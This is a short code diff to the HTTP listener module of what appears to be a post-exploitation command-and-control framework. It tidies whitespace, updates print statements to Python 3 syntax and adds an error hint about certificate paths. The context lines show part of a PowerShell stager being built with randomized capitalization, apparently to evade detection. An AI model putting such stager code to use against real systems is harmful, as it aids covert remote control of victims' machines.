@@ -321,7 +321,7 @@ class Listener:
                 if userAgent.lower() != 'none':
                     stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                     stager += "'User-Agent',$u);"
-                
+
                 if proxy.lower() != 'none':
                     if proxy.lower() == 'default':
                         stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
@@ -1091,7 +1091,8 @@ def send_message(packets=None):
                 app.run(host=bindIP, port=int(port), threaded=True)
 
         except Exception as e:
-            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
+            print(helpers.color("[!] Listener startup on port %s failed: %s " % (port, e)))
+            print(helpers.color("[!] Ensure the folder specified in CertPath exists and contains your pem and private key file."))
             dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http')
 
     def start(self, name=''):
